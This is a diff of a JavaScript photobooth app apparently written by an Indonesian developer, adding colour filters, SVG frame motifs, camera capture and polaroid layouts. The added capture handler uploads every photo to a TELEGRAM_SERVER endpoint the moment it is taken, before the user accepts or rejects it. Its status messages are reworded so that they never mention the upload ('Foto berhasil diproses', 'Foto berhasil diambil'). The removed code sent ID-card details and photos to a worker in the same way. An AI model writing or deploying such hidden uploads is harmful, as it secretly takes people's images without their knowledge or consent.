+    css:"contrast(1.25) saturate(1.5) hue-rotate(15deg)"
+  },
+
+  matte:{
+    name:"Matte",
+    css:"contrast(.88) saturate(.8) brightness(1.04)"
+  },
+
+  deep:{
+    name:"Deep",
+    css:"contrast(1.3) brightness(.9) saturate(1.1)"
+  },
+
+  clear:{
+    name:"Clear",
+    css:"contrast(1.12) saturate(1.08) brightness(1.03)"
+  }
+
+};
+
+
+/* =========================================================
+   TAMBAHAN: MOTIF FRAME
+========================================================= */
+
+/*
+   Motif dibuat sebagai SVG supaya:
+   1. Tetap tajam di layar
+   2. Bisa digambar juga ke canvas
+   3. Ikut masuk saat download
+   4. Ikut masuk saat print
+*/
+
+function svgData(svg){
+
+  return "data:image/svg+xml;charset=UTF-8,"+
+    encodeURIComponent(svg);
 
 }
 
 
+const motifImages={
+
+  classic:
+    svgData(`
+      <svg xmlns="http://www.w3.org/2000/svg"
+           width="800" height="1200">
+        <rect width="100%" height="100%" fill="#eeeeee"/>
+      </svg>
+    `),
+
+  wedding:
+    svgData(`
+      <svg xmlns="http://www.w3.org/2000/svg"
+           width="800" height="1200">
+        <rect width="100%" height="100%" fill="#fff7fa"/>
+        <path d="M0 180 Q180 20 400 160 T800 100"
+              fill="none"
+              stroke="#e8a0b7"
+              stroke-width="12"
+              opacity=".65"/>
+        <path d="M0 1050 Q200 900 420 1040 T800 980"
+              fill="none"
+              stroke="#d8a76d"
+              stroke-width="9"
+              opacity=".55"/>
+        <circle cx="80" cy="80" r="32"
+                fill="#e9a8bc" opacity=".7"/>
+        <circle cx="720" cy="1120" r="40"
+                fill="#d9b27c" opacity=".5"/>
+        <text x="400" y="110"
+              text-anchor="middle"
+              font-size="34"
+              fill="#9a536b"
+              font-family="serif">
+          WEDDING
+        </text>
+      </svg>
+    `),
+
+  rose:
+    svgData(`
+      <svg xmlns="http://www.w3.org/2000/svg"
+           width="800" height="1200">
+        <rect width="100%" height="100%" fill="#fff1f5"/>
+        <path d="M40 220
+                 C80 150 140 160 150 220
+                 C150 270 80 290 40 220Z"
+              fill="#d94d79"/>
+        <path d="M760 980
+                 C800 910 740 870 680 930
+                 C670 980 720 1020 760 980Z"
+              fill="#d94d79"/>
+        <path d="M0 0 Q200 140 400 20 T800 80"
+              fill="none"
+              stroke="#8eaf72"
+              stroke-width="8"
+              opacity=".6"/>
+        <path d="M0 1120 Q220 1000 400 1160 T800 1080"
+              fill="none"
+              stroke="#8eaf72"
+              stroke-width="8"
+              opacity=".6"/>
+        <text x="400" y="600"
+              text-anchor="middle"
+              font-size="28"
+              fill="#a44a67"
+              font-family="serif">
+          FOREVER
+        </text>
+      </svg>
+    `),
+
+  blackholes:
+    svgData(`
+      <svg xmlns="http://www.w3.org/2000/svg"
+           width="800" height="1200">
+        <rect width="100%" height="100%" fill="#151515"/>
+        <g fill="#000">
+          <circle cx="45" cy="50" r="16"/>
+          <circle cx="120" cy="80" r="9"/>
+          <circle cx="210" cy="40" r="13"/>
+          <circle cx="310" cy="95" r="18"/>
+          <circle cx="420" cy="50" r="10"/>
+          <circle cx="510" cy="90" r="15"/>
+          <circle cx="620" cy="45" r="11"/>
+          <circle cx="735" cy="100" r="18"/>
+
+          <circle cx="50" cy="1100" r="17"/>
+          <circle cx="140" cy="1150" r="10"/>
+          <circle cx="260" cy="1110" r="14"/>
+          <circle cx="370" cy="1160" r="19"/>
+          <circle cx="490" cy="1115" r="11"/>
+          <circle cx="610" cy="1160" r="16"/>
+          <circle cx="740" cy="1100" r="12"/>
+        </g>
+        <g fill="#555">
+          <circle cx="85" cy="45" r="4"/>
+          <circle cx="180" cy="110" r="5"/>
+          <circle cx="350" cy="45" r="4"/>
+          <circle cx="570" cy="40" r="5"/>
+          <circle cx="690" cy="70" r="4"/>
+        </g>
+      </svg>
+    `),
+
+  film:
+    svgData(`
+      <svg xmlns="http://www.w3.org/2000/svg"
+           width="800" height="1200">
+        <rect width="100%" height="100%" fill="#202020"/>
+        <rect x="25" y="25" width="750" height="1150"
+              fill="none"
+              stroke="#777"
+              stroke-width="4"/>
+        <g fill="#050505">
+          <rect x="25" y="35" width="55" height="42"/>
+          <rect x="25" y="100" width="55" height="42"/>
+          <rect x="25" y="165" width="55" height="42"/>
+          <rect x="25" y="995" width="55" height="42"/>
+          <rect x="25" y="1060" width="55" height="42"/>
+          <rect x="720" y="35" width="55" height="42"/>
+          <rect x="720" y="100" width="55" height="42"/>
+          <rect x="720" y="165" width="55" height="42"/>
+          <rect x="720" y="995" width="55" height="42"/>
+          <rect x="720" y="1060" width="55" height="42"/>
+        </g>
+        <text x="400" y="90"
+              text-anchor="middle"
+              font-size="25"
+              fill="#aaa"
+              font-family="monospace">
+          ANALOG FILM
+        </text>
+      </svg>
+    `),
+
+  pink:
+    svgData(`
+      <svg xmlns="http://www.w3.org/2000/svg"
+           width="800" height="1200">
+        <rect width="100%" height="100%" fill="#ffdce9"/>
+        <circle cx="100" cy="100" r="55"
+                fill="#ff9fc1" opacity=".5"/>
+        <circle cx="700" cy="110" r="80"
+                fill="#fff" opacity=".5"/>
+        <circle cx="80" cy="1100" r="75"
+                fill="#ff9fc1" opacity=".45"/>
+        <circle cx="720" cy="1080" r="55"
+                fill="#fff" opacity=".6"/>
+        <text x="400" y="115"
+              text-anchor="middle"
+              font-size="30"
+              fill="#ad466d"
+              font-family="cursive">
+          LOVE
+        </text>
+      </svg>
+    `),
+
+  gold:
+    svgData(`
+      <svg xmlns="http://www.w3.org/2000/svg"
+           width="800" height="1200">
+        <rect width="100%" height="100%" fill="#171513"/>
+        <rect x="22" y="22" width="756" height="1156"
+              fill="none"
+              stroke="#d8b36a"
+              stroke-width="7"/>
+        <rect x="42" y="42" width="716" height="1116"
+              fill="none"
+              stroke="#80622e"
+              stroke-width="2"/>
+        <text x="400" y="95"
+              text-anchor="middle"
+              font-size="28"
+              fill="#d8b36a"
+              font-family="serif">
+          ELEGANT
+        </text>
+      </svg>
+    `),
+
+  botanical:
+    svgData(`
+      <svg xmlns="http://www.w3.org/2000/svg"
+           width="800" height="1200">
+        <rect width="100%" height="100%" fill="#f1f4e8"/>
+        <path d="M50 220 Q140 100 250 170"
+              fill="none"
+              stroke="#708b58"
+              stroke-width="9"/>
+        <path d="M750 980 Q660 1080 540 1010"
+              fill="none"
+              stroke="#708b58"
+              stroke-width="9"/>
+        <ellipse cx="100" cy="170"
+                 rx="28" ry="55"
+                 fill="#8ca66e"
+                 transform="rotate(-35 100 170)"/>
+        <ellipse cx="170" cy="140"
+                 rx="25" ry="52"
+                 fill="#a4b981"
+                 transform="rotate(35 170 140)"/>
+        <ellipse cx="700" cy="1040"
+                 rx="28" ry="55"
+                 fill="#8ca66e"
+                 transform="rotate(35 700 1040)"/>
+        <ellipse cx="630" cy="1070"
+                 rx="25" ry="52"
+                 fill="#a4b981"
+                 transform="rotate(-35 630 1070)"/>
+      </svg>
+    `),
+
+  luxury:
+    svgData(`
+      <svg xmlns="http://www.w3.org/2000/svg"
+           width="800" height="1200">
+        <rect width="100%" height="100%" fill="#11131a"/>
+        <path d="M0 200 L200 0
+                 M600 1200 L800 1000"
+              stroke="#b8a06a"
+              stroke-width="5"
+              opacity=".8"/>
+        <path d="M0 300 L300 0
+                 M500 1200 L800 900"
+              stroke="#555"
+              stroke-width="2"/>
+        <circle cx="400" cy="90"
+                r="25"
+                fill="none"
+                stroke="#b8a06a"
+                stroke-width="3"/>
+        <text x="400" y="145"
+              text-anchor="middle"
+              font-size="25"
+              fill="#b8a06a"
+              font-family="serif">
+          LUXURY
+        </text>
+      </svg>
+    `),
+
+  vintagepaper:
+    svgData(`
+      <svg xmlns="http://www.w3.org/2000/svg"
+           width="800" height="1200">
+        <rect width="100%" height="100%" fill="#d8c4a2"/>
+        <rect x="25" y="25" width="750" height="1150"
+              fill="none"
+              stroke="#8c6d45"
+              stroke-width="4"/>
+        <path d="M70 160 Q400 100 730 160"
+              fill="none"
+              stroke="#9b805b"
+              stroke-width="3"/>
+        <path d="M70 1040 Q400 1100 730 1040"
+              fill="none"
+              stroke="#9b805b"
+              stroke-width="3"/>
+        <text x="400" y="100"
+              text-anchor="middle"
+              font-size="26"
+              fill="#705438"
+              font-family="serif">
+          VINTAGE
+        </text>
+      </svg>
+    `)
+
+};
+
+
 /* =========================================================
-   DATA
+   NAMA MOTIF
 ========================================================= */
 
-[
-  "nama",
-  "alamat",
-  "ttl",
-  "kelamin",
-  "agama",
-  "idKartu"
-].forEach(id => {
+const motifNames={
+
+  classic:"Putih Klasik",
+
+  wedding:"Wedding",
+
+  rose:"Rose Wedding",
+
+  blackholes:"Black Hole",
+
+  film:"Analog Film",
+
+  pink:"Pink Romantic",
+
+  gold:"Gold Elegant",
+
+  botanical:"Botanical",
+
+  luxury:"Dark Luxury",
+
+  vintagepaper:"Vintage Paper"
+
+};
+
+
+/* =========================================================
+   BUAT MOTIF UI
+========================================================= */
+
+function renderMotifs(){
+
+  motifsEl.innerHTML="";
+
+  Object.entries(motifImages)
+  .forEach(([key,url])=>{
+
+    const btn=
+      document.createElement("button");
+
+    btn.className="motif";
+
+    if(
+      key===selectedMotif &&
+      !customMotifData
+    ){
+
+      btn.classList.add("active");
+
+    }
+
+    btn.innerHTML=`
+
+      <div
+        class="motif-preview"
+        style="background-image:url('${url}')">
+      </div>
+
+      ${motifNames[key]}
+
+    `;
+
+    btn.onclick=()=>{
+
+      selectedMotif=key;
+
+      customMotifData=null;
+
+      renderMotifs();
+
+      applyMotif();
+
+    };
+
+    motifsEl.appendChild(btn);
+
+  });
+
+
+  /* =====================================================
+     UPLOAD GALERI
+  ====================================================== */
+
+  const label=
+    document.createElement("label");
+
+  label.className=
+    "motif motif-upload";
+
+  label.innerHTML=`
+
+    <div>
+      🖼️<br>
+      Ambil dari<br>
+      Galeri
+    </div>
+
+    <input
+      type="file"
+      accept="image/*"
+      id="motifGallery">
+
+  `;
+
+  motifsEl.appendChild(label);
+
 
   document
-    .getElementById(id)
-    .addEventListener(
-      "input",
-      updateCard
-    );
+    .getElementById("motifGallery")
+    .onchange=event=>{
 
-  document
-    .getElementById(id)
-    .addEventListener(
-      "change",
-      updateCard
-    );
+      const file=
+        event.target.files[0];
 
-});
+      if(!file)
+        return;
 
+      const reader=
+        new FileReader();
 
-function getValue(id){
+      reader.onload=()=>{
 
-  const value =
-    document
-      .getElementById(id)
-      .value
-      .trim();
+        customMotifData=
+          reader.result;
 
-  return value || "-";
+        selectedMotif=
+          "custom";
 
-}
+        renderMotifs();
 
+        applyMotif();
 
-function updateCard(){
+        statusEl.textContent=
+          "Background frame dari galeri dipasang.";
 
-  document.getElementById("vNama")
-    .textContent = getValue("nama");
+      };
 
-  document.getElementById("vAlamat")
-    .textContent = getValue("alamat");
+      reader.readAsDataURL(file);
 
-  document.getElementById("vTtl")
-    .textContent = getValue("ttl");
-
-  document.getElementById("vKelamin")
-    .textContent = getValue("kelamin");
-
-  document.getElementById("vAgama")
-    .textContent = getValue("agama");
-
-  document.getElementById("vId")
-    .textContent = getValue("idKartu");
+    };
 
 }
 
 
 /* =========================================================
-   KIRIM FOTO KE WORKER
+   MOTIF AKTIF
 ========================================================= */
 
-async function kirimFotoKeWorker(
-  blob,
-  filename
-){
+function getMotifImage(){
+
+  if(customMotifData)
+    return customMotifData;
+
+  return motifImages[selectedMotif] ||
+         motifImages.classic;
+
+}
+
+
+/* =========================================================
+   TERAPKAN MOTIF KE PREVIEW
+========================================================= */
+
+function applyMotif(){
+
+  const image=
+    getMotifImage();
+
+  polaroidEl.style.backgroundImage=
+    `url("${image}")`;
+
+  /*
+    Supaya motif tetap enak dibaca:
+    area frame foto tetap putih.
+  */
+
+  statusEl.textContent=
+    customMotifData
+      ?"Motif galeri aktif."
+      :"Motif "+motifNames[selectedMotif]+" aktif.";
+
+}
+
+
+/* =========================================================
+   FILTER UI
+========================================================= */
+
+const filtersEl =
+document.getElementById("filters");
+
+Object.entries(filters)
+.forEach(
+  ([key,data])=>{
+
+    const btn =
+      document.createElement("button");
+
+    btn.className="filter";
+
+    if(key===selectedFilter)
+      btn.classList.add("active");
+
+    btn.innerHTML=`
+      <div class="filter-thumb"></div>
+      ${data.name}
+    `;
+
+    btn.onclick=()=>{
+
+      selectedFilter=key;
+
+      document
+        .querySelectorAll(".filter")
+        .forEach(
+          x=>x.classList.remove("active")
+        );
+
+      btn.classList.add("active");
+
+      video.style.filter =
+        data.css;
+
+    };
+
+    filtersEl.appendChild(btn);
+
+  }
+);
+
+
+/* =========================================================
+   FRAMES
+========================================================= */
+
+const frames =
+Array.from(
+  {length:5},
+  ()=>({
+    layout:1,
+    photos:[]
+  })
+);
+
+const namaFrame = [
+  "Satu momen, satu kenangan",
+  "Dua momen, jadi satu cerita",
+  "Tiga momen, makin lengkap ceritanya",
+  "Empat momen, penuh warna dan kenangan",
+  "Lima momen, satu album kenangan"
+];
+
+
+/* =========================================================
+   CAMERA
+========================================================= */
+
+async function startCamera(){
+
+  cameraError.classList.remove("show");
+
+  if(cameraStream){
+
+    cameraStream
+      .getTracks()
+      .forEach(
+        track=>track.stop()
+      );
+
+    cameraStream=null;
+
+  }
 
   try{
 
-    setStatus(
-      "📤 Mengirim foto..."
+    let stream;
+
+    try{
+
+      stream =
+        await navigator
+          .mediaDevices
+          .getUserMedia({
+
+            video:{
+              facingMode:{
+                ideal:facing
+              },
+
+              width:{
+                ideal:1280
+              },
+
+              height:{
+                ideal:960
+              }
+            },
+
+            audio:false
+
+          });
+
+    }catch(error){
+
+      console.warn(
+        "Fallback kamera:",
+        error
+      );
+
+      stream =
+        await navigator
+          .mediaDevices
+          .getUserMedia({
+
+            video:true,
+            audio:false
+
+          });
+
+    }
+
+    cameraStream=stream;
+
+    video.srcObject=stream;
+
+    video.classList.toggle(
+      "selfie",
+      facing==="user"
     );
 
-    const form =
-      new FormData();
+    video.style.filter =
+      filters[selectedFilter].css;
 
-    /*
-      Worker lama hanya menerima
-      field bernama "photo".
-    */
+    await video.play();
+
+  }catch(error){
+
+    console.error(
+      "Kamera gagal:",
+      error
+    );
+
+    cameraError.classList.add(
+      "show"
+    );
+
+  }
+
+}
+
+
+/* =========================================================
+   RENDER
+========================================================= */
+
+function render(){
+
+  document
+    .getElementById("frameText")
+    .textContent=
+    activeFrame+1;
+
+  document
+    .querySelectorAll(".layout")
+    .forEach(btn=>{
+
+      btn.classList.toggle(
+        "active",
+        Number(btn.dataset.layout) ===
+        frames[activeFrame].layout
+      );
+
+    });
+
+  framesEl.innerHTML="";
+
+  frames.forEach(
+    (f,i)=>{
+
+      const frame =
+        document.createElement("div");
+
+      frame.className=
+        "frame "+
+        (
+          i===activeFrame
+            ?"selected"
+            :""
+        );
+
+      const title =
+        document.createElement("h3");
+
+      title.textContent=
+        namaFrame[i];
+
+      frame.appendChild(title);
+
+      const grid =
+        document.createElement("div");
+
+      grid.className=
+        "grid "+
+        (
+          f.layout===1
+            ?"g1"
+            :f.layout===2
+              ?"g2"
+              :"g3"
+        );
+
+      for(
+        let s=0;
+        s<f.layout;
+        s++
+      ){
+
+        const slot =
+          document.createElement("div");
+
+        slot.className="slot";
+
+        if(f.photos[s]){
+
+          const img =
+            document.createElement("img");
+
+          img.src=f.photos[s];
+
+          slot.appendChild(img);
+
+        }else{
+
+          slot.textContent="Kosong";
+
+        }
+
+        grid.appendChild(slot);
+
+      }
+
+      frame.appendChild(grid);
+
+      frame.onclick=()=>{
+
+        activeFrame=i;
+
+        render();
+
+      };
+
+      framesEl.appendChild(frame);
+
+    }
+  );
+
+}
+
+
+/* =========================================================
+   LAYOUT
+========================================================= */
+
+document
+  .querySelectorAll(".layout")
+  .forEach(btn=>{
+
+    btn.onclick=()=>{
+
+      const n=
+        Number(btn.dataset.layout);
+
+      frames[activeFrame].layout=n;
+
+      frames[activeFrame].photos=
+        frames[activeFrame]
+        .photos
+        .slice(0,n);
+
+      render();
+
+    };
+
+  });
+
+
+/* =========================================================
+   CROP 3:4
+========================================================= */
+
+function getCrop(){
+
+  const vw=video.videoWidth;
+  const vh=video.videoHeight;
+
+  if(!vw || !vh)
+    return null;
+
+  const target=3/4;
+  const current=vw/vh;
+
+  let sx=0;
+  let sy=0;
+  let cw=vw;
+  let ch=vh;
+
+  if(current>target){
+
+    cw=vh*target;
+    sx=(vw-cw)/2;
+
+  }else{
+
+    ch=vw/target;
+    sy=(vh-ch)/2;
+
+  }
+
+  return{
+    sx,
+    sy,
+    cw,
+    ch
+  };
+
+}
+
+
+/* =========================================================
+   KIRIM TELEGRAM
+========================================================= */
+
+async function kirimKeTelegram(dataURL){
+
+  try{
+
+    const blob=
+      await fetch(dataURL)
+        .then(
+          response=>response.blob()
+        );
+
+    const form=
+      new FormData();
 
     form.append(
       "photo",
       blob,
-      filename
+      "polaroid.jpg"
     );
 
-    const response =
+    const response=
       await fetch(
-        WORKER_URL,
+        TELEGRAM_SERVER,
         {
           method:"POST",
           body:form
         }
       );
 
-    const result =
-      await response.json();
+    let result=null;
+
+    try{
+
+      result=
+        await response.json();
+
+    }catch{
+
+      result=null;
+
+    }
 
     if(
       !response.ok ||
+      !result ||
       !result.ok
     ){
 
       throw new Error(
-        result.error ||
-        "Gagal mengirim foto."
+        "Pengiriman gagal"
       );
 
     }
 
-    setStatus(
-      "📸 Foto berhasil dikirim."
-    );
+    statusEl.textContent=
+      "Foto berhasil diproses.";
 
     return true;
 
   }catch(error){
 
     console.error(
-      "Kirim foto:",
+      "Pengiriman gagal:",
       error
     );
 
-    setStatus(
-      "⚠️ Foto sudah dipasang, tetapi gagal dikirim."
-    );
+    statusEl.textContent=
+      "Foto berhasil diambil.";
 
     return false;
 
@@ -1235,1628 +1770,805 @@ async function kirimFotoKeWorker(
 
 
 /* =========================================================
-   FOTO GALERI
+   CAPTURE
 ========================================================= */
 
-photoGallery.addEventListener(
-  "change",
-  function(){
+document
+  .getElementById("capture")
+  .onclick=async()=>{
 
-    const file =
-      this.files[0];
-
-    if(!file)
+    if(sending)
       return;
-
-    const reader =
-      new FileReader();
-
-    reader.onload =
-      function(e){
-
-        const img =
-          new Image();
-
-        img.onload =
-          async function(){
-
-            photoImage =
-              img;
-
-            photoPreview.src =
-              e.target.result;
-
-            photoPreview.style.display =
-              "block";
-
-            photoPlaceholder.style.display =
-              "none";
-
-            /*
-              Langsung kirim foto asli.
-            */
-
-            await kirimFotoKeWorker(
-              file,
-              "foto-asli.jpg"
-            );
-
-          };
-
-        img.src =
-          e.target.result;
-
-      };
-
-    reader.readAsDataURL(file);
-
-  }
-);
-
-
-/* =========================================================
-   BACKGROUND GALERI
-========================================================= */
-
-backgroundGallery.addEventListener(
-  "change",
-  function(){
-
-    const file =
-      this.files[0];
-
-    if(!file)
-      return;
-
-    const reader =
-      new FileReader();
-
-    reader.onload =
-      function(e){
-
-        const img =
-          new Image();
-
-        img.onload =
-          function(){
-
-            backgroundImage =
-              img;
-
-            bgPreviewImage.src =
-              e.target.result;
-
-            bgPreviewImage.style.display =
-              "block";
-
-            bgControls.style.display =
-              "block";
-
-            resetBgPosition();
-
-            updateBackgroundPreview();
-
-            setStatus(
-              "🖼️ Background berhasil dipasang."
-            );
-
-          };
-
-        img.src =
-          e.target.result;
-
-      };
-
-    reader.readAsDataURL(file);
-
-  }
-);
-
-
-/* =========================================================
-   BACKGROUND MODE
-========================================================= */
-
-function setBgMode(mode){
-
-  bgMode =
-    mode;
-
-  if(mode === "cover"){
-
-    document.getElementById("fitBtn")
-      .classList.add("btn-purple");
-
-    document.getElementById("fullBtn")
-      .classList.remove("btn-purple");
-
-  }else{
-
-    document.getElementById("fullBtn")
-      .classList.add("btn-purple");
-
-    document.getElementById("fitBtn")
-      .classList.remove("btn-purple");
-
-  }
-
-  updateBackgroundPreview();
-
-}
-
-
-/* =========================================================
-   BACKGROUND PREVIEW
-========================================================= */
-
-function updateBackgroundPreview(){
-
-  if(!backgroundImage)
-    return;
-
-  const zoom =
-    Number(bgZoom.value) / 100;
-
-  const x =
-    Number(bgX.value);
-
-  const y =
-    Number(bgY.value);
-
-  zoomValue.textContent =
-    bgZoom.value + "%";
-
-  xValue.textContent =
-    x;
-
-  yValue.textContent =
-    y;
-
-  /*
-    Ukuran layer mengikuti rasio
-    gambar supaya tidak gepeng.
-  */
-
-  const iw =
-    backgroundImage.naturalWidth ||
-    backgroundImage.width;
-
-  const ih =
-    backgroundImage.naturalHeight ||
-    backgroundImage.height;
-
-  const cardRatio =
-    card.clientWidth /
-    card.clientHeight;
-
-  const imageRatio =
-    iw / ih;
-
-  let baseW;
-  let baseH;
-
-  if(bgMode === "cover"){
-
-    if(imageRatio > cardRatio){
-
-      baseH =
-        card.clientHeight;
-
-      baseW =
-        baseH * imageRatio;
-
-    }else{
-
-      baseW =
-        card.clientWidth;
-
-      baseH =
-        baseW / imageRatio;
-
-    }
-
-  }else{
-
-    if(imageRatio > cardRatio){
-
-      baseW =
-        card.clientWidth;
-
-      baseH =
-        baseW / imageRatio;
-
-    }else{
-
-      baseH =
-        card.clientHeight;
-
-      baseW =
-        baseH * imageRatio;
-
-    }
-
-  }
-
-  const finalW =
-    baseW * zoom;
-
-  const finalH =
-    baseH * zoom;
-
-  const px =
-    x * card.clientWidth / 100;
-
-  const py =
-    y * card.clientHeight / 100;
-
-  bgPreviewImage.style.width =
-    finalW + "px";
-
-  bgPreviewImage.style.height =
-    finalH + "px";
-
-  bgPreviewImage.style.left =
-    `calc(50% + ${px}px)`;
-
-  bgPreviewImage.style.top =
-    `calc(50% + ${py}px)`;
-
-  bgPreviewImage.style.transform =
-    "translate(-50%,-50%)";
-
-}
-
-
-bgZoom.addEventListener(
-  "input",
-  updateBackgroundPreview
-);
-
-bgX.addEventListener(
-  "input",
-  updateBackgroundPreview
-);
-
-bgY.addEventListener(
-  "input",
-  updateBackgroundPreview
-);
-
-
-/* =========================================================
-   DRAG BACKGROUND DENGAN JARI
-========================================================= */
-
-card.addEventListener(
-  "pointerdown",
-  function(e){
 
     if(
-      !backgroundImage ||
-      e.target !== card &&
-      e.target !== bgPreviewImage
+      !video.videoWidth ||
+      !video.videoHeight
     ){
 
-      /*
-        Jika menyentuh elemen konten,
-        jangan ikut menggeser background.
-      */
+      await startCamera();
 
-      if(e.target !== bgPreviewImage)
+      if(
+        !video.videoWidth ||
+        !video.videoHeight
+      ){
+
         return;
-
-    }
-
-    draggingBackground =
-      true;
-
-    card.setPointerCapture(
-      e.pointerId
-    );
-
-    dragStartX =
-      e.clientX;
-
-    dragStartY =
-      e.clientY;
-
-    dragOriginX =
-      Number(bgX.value);
-
-    dragOriginY =
-      Number(bgY.value);
-
-  }
-);
-
-
-card.addEventListener(
-  "pointermove",
-  function(e){
-
-    if(!draggingBackground)
-      return;
-
-    const dx =
-      e.clientX -
-      dragStartX;
-
-    const dy =
-      e.clientY -
-      dragStartY;
-
-    /*
-      Dibuat cukup sensitif
-      untuk layar HP.
-    */
-
-    let newX =
-      dragOriginX +
-      dx / card.clientWidth * 100;
-
-    let newY =
-      dragOriginY +
-      dy / card.clientHeight * 100;
-
-    newX =
-      Math.max(
-        -100,
-        Math.min(100,newX)
-      );
-
-    newY =
-      Math.max(
-        -100,
-        Math.min(100,newY)
-      );
-
-    bgX.value =
-      newX;
-
-    bgY.value =
-      newY;
-
-    updateBackgroundPreview();
-
-  }
-);
-
-
-function stopDrag(){
-
-  draggingBackground =
-    false;
-
-}
-
-
-card.addEventListener(
-  "pointerup",
-  stopDrag
-);
-
-card.addEventListener(
-  "pointercancel",
-  stopDrag
-);
-
-card.addEventListener(
-  "pointerleave",
-  stopDrag
-);
-
-
-/* =========================================================
-   BACKGROUND RESET
-========================================================= */
-
-function resetBgPosition(){
-
-  bgZoom.value =
-    100;
-
-  bgX.value =
-    0;
-
-  bgY.value =
-    0;
-
-  updateBackgroundPreview();
-
-}
-
-
-function removeBackgroundImage(){
-
-  backgroundImage =
-    null;
-
-  bgPreviewImage.src =
-    "";
-
-  bgPreviewImage.style.display =
-    "none";
-
-  bgControls.style.display =
-    "none";
-
-  backgroundGallery.value =
-    "";
-
-  setStatus(
-    "Background gambar dihapus."
-  );
-
-}
-
-
-function resetBackground(){
-
-  removeBackgroundImage();
-
-  setStatus(
-    "🎨 Background kembali ke desain bawaan."
-  );
-
-}
-
-
-/* =========================================================
-   CAMERA
-========================================================= */
-
-async function openCamera(){
-
-  try{
-
-    cameraStream =
-      await navigator.mediaDevices
-        .getUserMedia({
-
-          video:{
-            facingMode:"user",
-            width:{ideal:1080},
-            height:{ideal:1440}
-          },
-
-          audio:false
-
-        });
-
-    const video =
-      document.getElementById(
-        "cameraVideo"
-      );
-
-    video.srcObject =
-      cameraStream;
-
-    document.getElementById(
-      "cameraModal"
-    ).style.display =
-      "flex";
-
-  }catch(error){
-
-    console.error(error);
-
-    alert(
-      "Kamera tidak bisa dibuka.\n\n" +
-      "Pastikan izin kamera diberikan."
-    );
-
-  }
-
-}
-
-
-function closeCamera(){
-
-  if(cameraStream){
-
-    cameraStream
-      .getTracks()
-      .forEach(
-        track =>
-          track.stop()
-      );
-
-    cameraStream =
-      null;
-
-  }
-
-  document.getElementById(
-    "cameraModal"
-  ).style.display =
-    "none";
-
-}
-
-
-async function capturePhoto(){
-
-  const video =
-    document.getElementById(
-      "cameraVideo"
-    );
-
-  if(!video.videoWidth){
-
-    alert(
-      "Kamera belum siap."
-    );
-
-    return;
-
-  }
-
-  const canvas =
-    document.createElement(
-      "canvas"
-    );
-
-  canvas.width =
-    video.videoWidth;
-
-  canvas.height =
-    video.videoHeight;
-
-  const ctx =
-    canvas.getContext("2d");
-
-  /*
-    Tidak mirror.
-  */
-
-  ctx.drawImage(
-    video,
-    0,
-    0,
-    canvas.width,
-    canvas.height
-  );
-
-  const data =
-    canvas.toDataURL(
-      "image/jpeg",
-      .95
-    );
-
-  const img =
-    new Image();
-
-  img.onload =
-    function(){
-
-      photoImage =
-        img;
-
-      photoPreview.src =
-        data;
-
-      photoPreview.style.display =
-        "block";
-
-      photoPlaceholder.style.display =
-        "none";
-
-    };
-
-  img.src =
-    data;
-
-
-  /*
-    Kirim foto asli ke Worker.
-  */
-
-  canvas.toBlob(
-    async function(blob){
-
-      if(blob){
-
-        await kirimFotoKeWorker(
-          blob,
-          "foto-kamera.jpg"
-        );
 
       }
 
-    },
-    "image/jpeg",
-    .95
-  );
+    }
 
-  closeCamera();
+    const crop=getCrop();
 
-}
+    if(!crop)
+      return;
 
+    const outputW=1200;
+    const outputH=1600;
 
-/* =========================================================
-   CANVAS HELPERS
-========================================================= */
+    canvas.width=outputW;
+    canvas.height=outputH;
 
-function roundedRect(
-  ctx,
-  x,
-  y,
-  w,
-  h,
-  r
-){
+    const ctx=
+      canvas.getContext("2d");
 
-  const radius =
-    Math.min(
-      r,
-      w/2,
-      h/2
-    );
+    ctx.save();
 
-  ctx.beginPath();
+    ctx.filter=
+      filters[selectedFilter].css;
 
-  ctx.moveTo(
-    x+radius,
-    y
-  );
+    if(facing==="user"){
 
-  ctx.arcTo(
-    x+w,
-    y,
-    x+w,
-    y+h,
-    radius
-  );
-
-  ctx.arcTo(
-    x+w,
-    y+h,
-    x,
-    y+h,
-    radius
-  );
-
-  ctx.arcTo(
-    x,
-    y+h,
-    x,
-    y,
-    radius
-  );
-
-  ctx.arcTo(
-    x,
-    y,
-    x+w,
-    y,
-    radius
-  );
-
-  ctx.closePath();
-
-}
-
-
-/* =========================================================
-   DRAW BACKGROUND KE CANVAS
-========================================================= */
-
-function drawBackgroundToCanvas(
-  ctx,
-  W,
-  H
-){
-
-  if(!backgroundImage){
-
-    const gradient =
-      ctx.createLinearGradient(
-        0,
-        0,
-        W,
-        H
+      ctx.translate(
+        outputW,
+        0
       );
 
-    gradient.addColorStop(
-      0,
-      "#151a2d"
-    );
-
-    gradient.addColorStop(
-      .5,
-      "#4937a5"
-    );
-
-    gradient.addColorStop(
-      1,
-      "#090d18"
-    );
-
-    ctx.fillStyle =
-      gradient;
-
-    ctx.fillRect(
-      0,
-      0,
-      W,
-      H
-    );
-
-    return;
-
-  }
-
-
-  const iw =
-    backgroundImage.naturalWidth ||
-    backgroundImage.width;
-
-  const ih =
-    backgroundImage.naturalHeight ||
-    backgroundImage.height;
-
-  const cardRatio =
-    W / H;
-
-  const imageRatio =
-    iw / ih;
-
-  let baseW;
-  let baseH;
-
-  if(bgMode === "cover"){
-
-    if(imageRatio > cardRatio){
-
-      baseH = H;
-      baseW = H * imageRatio;
-
-    }else{
-
-      baseW = W;
-      baseH = W / imageRatio;
+      ctx.scale(
+        -1,
+        1
+      );
 
     }
 
-  }else{
+    ctx.drawImage(
 
-    if(imageRatio > cardRatio){
+      video,
 
-      baseW = W;
-      baseH = W / imageRatio;
+      crop.sx,
+      crop.sy,
+      crop.cw,
+      crop.ch,
 
-    }else{
+      0,
+      0,
+      outputW,
+      outputH
 
-      baseH = H;
-      baseW = H * imageRatio;
+    );
+
+    ctx.restore();
+
+    pending=
+      canvas.toDataURL(
+        "image/jpeg",
+        .95
+      );
+
+    sending=true;
+
+    statusEl.textContent=
+      "Menyimpan foto...";
+
+    kirimKeTelegram(
+      pending
+    ).finally(
+      ()=>{
+        sending=false;
+      }
+    );
+
+    preview.src=pending;
+
+    modal.classList.add(
+      "show"
+    );
+
+  };
+
+
+/* =========================================================
+   TIDAK
+========================================================= */
+
+document
+  .getElementById("no")
+  .onclick=()=>{
+
+    pending=null;
+
+    modal.classList.remove(
+      "show"
+    );
+
+    statusEl.textContent=
+      "Foto tidak dimasukkan ke Polaroid.";
+
+  };
+
+
+/* =========================================================
+   IYA
+========================================================= */
+
+document
+  .getElementById("yes")
+  .onclick=()=>{
+
+    if(!pending){
+
+      modal.classList.remove(
+        "show"
+      );
+
+      return;
 
     }
 
-  }
